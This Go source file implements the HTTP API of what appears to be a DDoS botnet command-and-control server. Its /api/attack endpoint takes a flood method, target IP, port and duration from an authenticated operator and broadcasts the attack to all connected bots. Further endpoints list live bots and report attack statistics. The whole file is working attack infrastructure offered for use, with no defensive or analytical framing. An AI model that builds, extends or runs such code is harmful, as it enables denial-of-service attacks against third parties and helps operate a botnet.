package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"time"
)

type httpAPI struct {
	port   string
	server *http.Server
	up     bool
}

type jsonOut struct {
	OK   bool        `json:"success"`
	Msg  string      `json:"message,omitempty"`
	Data interface{} `json:"data,omitempty"`
}

type floodReq struct {
	Method   string `json:"method"`
	TargetIP string `json:"target_ip"`
	Port     int    `json:"port"`
	Duration int    `json:"duration"`
	Username string `json:"username"`
	Token    string `json:"token"`
	Secret   string `json:"secret"`
}

type srvStats struct {
	TotalBots     int    `json:"total_bots"`
	ActiveBots    int    `json:"active_bots"`
	TotalAttacks  int    `json:"total_attacks"`
	ActiveAttacks int    `json:"active_attacks"`
	Uptime        string `json:"uptime"`
}

var (
	httpd     *httpAPI
	startedAt time.Time
)

func init() { startedAt = time.Now() }

func newHTTPAPI(port string) *httpAPI { return &httpAPI{port: port} }

func (s *httpAPI) Serve() error {
	if s.up {
		return fmt.Errorf("already running")
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/api/attack", s.rateLimit(s.handleFlood))
	mux.HandleFunc("/api/bots", s.rateLimit(s.handleBots))
	mux.HandleFunc("/api/stats", s.rateLimit(s.handleStats))
	s.server = &http.Server{Addr: ":" + s.port, Handler: mux}
	s.up = true
	go func() {
		fmt.Printf("[api] https on :%s\n", s.port)
		if err := s.server.ListenAndServeTLS(certPath, keyPath); err != nil && err != http.ErrServerClosed {
			fmt.Printf("[api] err: %v\n", err)
			s.up = false
		}
	}()
	return nil
}

func (s *httpAPI) handleFlood(w http.ResponseWriter, r *http.Request) {
	tok := r.Header.Get("X-API-Token")
	if ok, wait := rlCheck(rlAPI, tok); !ok {
		s.jsonErr(w, fmt.Sprintf("rate limited, retry in %v", wait), http.StatusTooManyRequests)
		return
	}
	if r.Method != http.MethodPost {
		s.jsonErr(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	var req floodReq
	if json.NewDecoder(r.Body).Decode(&req) != nil {
		s.jsonErr(w, "bad json", http.StatusBadRequest)
		return
	}
	if req.Method == "" || req.TargetIP == "" || req.Port <= 0 || req.Duration <= 0 || req.Username == "" || req.Token == "" || req.Secret == "" {
		s.jsonErr(w, "missing fields", http.StatusBadRequest)
		return
	}
	if ip := net.ParseIP(req.TargetIP); ip != nil {
		if ip.IsLoopback() || ip.IsPrivate() || ip.IsMulticast() {
			s.jsonErr(w, "target not allowed", http.StatusBadRequest)
			return
		}
	}
	if req.Port < 1 || req.Port > 65535 {
		s.jsonErr(w, "port out of range", http.StatusBadRequest)
		return
	}
	if int64(req.Duration)*int64(time.Second) < 0 {
		s.jsonErr(w, "duration overflow", http.StatusBadRequest)
		return
	}
	if !validMethod(req.Method) {
		s.jsonErr(w, "unknown method", http.StatusBadRequest)
		return
	}
	if !s.authMiddleware(req.Token, req.Secret, req.Username) {
		s.jsonErr(w, "auth failed", http.StatusUnauthorized)
		return
	}
	users, err := readUsers()
	if err != nil {
		s.jsonErr(w, "internal error", http.StatusInternalServerError)
		return
	}
	var u *acct
	for i := range users {
		if users[i].Username == req.Username {
			u = &users[i]
			break
		}
	}
	if u == nil || !u.canUse(req.Method) {
		s.jsonErr(w, "forbidden", http.StatusForbidden)
		return
	}
	ip := net.ParseIP(req.TargetIP)
	if ip == nil || !checkIP(req.TargetIP) {
		s.jsonErr(w, "invalid target", http.StatusBadRequest)
		return
	}
	ip4 := ip.To4()
	if ip4 == nil {
		s.jsonErr(w, "ipv4 required", http.StatusBadRequest)
		return
	}
	var c cmd
	copy(c.Method[:], req.Method)
	copy(c.TargetIP[:], ip4)
	c.Port = uint16(req.Port)
	c.Duration = uint32(req.Duration)
	floodAll(c)

	a := flood{
		method: req.Method, target: req.TargetIP, port: strconv.Itoa(req.Port),
		dur: time.Duration(req.Duration) * time.Second, started: time.Now(), who: req.Username,
	}
	histMu.Lock()
	hist = append(hist, a)
	histMu.Unlock()
	trackAPIFlood(a)

	s.jsonOK(w, jsonOut{OK: true, Msg: "attack started"}, http.StatusOK)
}

func (s *httpAPI) handleBots(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		s.jsonErr(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	tok := r.URL.Query().Get("token")
	sec := r.URL.Query().Get("secret")
	usr := r.URL.Query().Get("username")
	if tok == "" || sec == "" || usr == "" {
		s.jsonErr(w, "missing auth params", http.StatusBadRequest)
		return
	}
	if !s.authMiddleware(tok, sec, usr) {
		s.jsonErr(w, "auth failed", http.StatusUnauthorized)
		return
	}
	s.jsonOK(w, jsonOut{OK: true, Data: liveNodes()}, http.StatusOK)
}

func (s *httpAPI) handleStats(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		s.jsonErr(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	tok := r.URL.Query().Get("token")
	sec := r.URL.Query().Get("secret")
	usr := r.URL.Query().Get("username")
	if tok == "" || sec == "" || usr == "" {
		s.jsonErr(w, "missing auth params", http.StatusBadRequest)
		return
	}
	if !s.authMiddleware(tok, sec, usr) {
		s.jsonErr(w, "auth failed", http.StatusUnauthorized)
		return
	}
	sum := heartbeats.stats()
	apiMu.RLock()
	apiActive := len(apiJobs)
	apiMu.RUnlock()
	runMu.Lock()
	stdActive := len(running)
	runMu.Unlock()
	histMu.Lock()
	total := len(hist)
	histMu.Unlock()

	s.jsonOK(w, jsonOut{OK: true, Data: srvStats{
		TotalBots: sum["TOTAL"], ActiveBots: sum["ONLINE"] + sum["LAGGING"],
		TotalAttacks: total, ActiveAttacks: stdActive + apiActive,
		Uptime: time.Since(startedAt).Truncate(time.Second).String(),
	}}, http.StatusOK)
}

func (s *httpAPI) authMiddleware(tok, sec, usr string) bool {
	if stored, ok := secrets.Get(usr + "_api_secret"); ok && secureEq(stored, sec) {
		return true
	}
	users, err := readUsers()
	if err != nil {
		return false
	}
	for _, u := range users {
		if u.Username == usr {
			if tok != u.APIToken {
				return false
			}
			return matchKey(u.APISecret, sec)
		}
	}
	return false
}

func (s *httpAPI) rateLimit(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		ip, _, _ := net.SplitHostPort(r.RemoteAddr)
		if ok, wait := rlCheck(rlConn, ip); !ok {
			s.jsonErr(w, fmt.Sprintf("rate limited, retry in %v", wait), http.StatusTooManyRequests)
			return
		}
		next(w, r)
	}
}

func (s *httpAPI) jsonOK(w http.ResponseWriter, resp jsonOut, code int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(resp)
}

func (s *httpAPI) jsonErr(w http.ResponseWriter, msg string, code int) {
	s.jsonOK(w, jsonOut{OK: false, Msg: msg}, code)
}
